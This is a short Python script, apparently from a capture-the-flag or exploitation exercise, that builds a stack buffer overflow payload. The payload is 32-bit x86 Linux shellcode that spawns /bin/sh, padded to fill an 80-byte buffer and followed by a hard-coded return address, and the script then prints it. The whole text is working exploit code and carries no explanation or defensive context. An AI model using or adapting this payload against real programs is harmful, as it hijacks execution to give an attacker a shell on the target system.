len_buffer = 80
shell_code = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
return_address = b"\x08\xa0\x04\x08"

payload = (
    shell_code +
    b"A" * (len_buffer - len(shell_code)) +
    return_address
)

print(payload)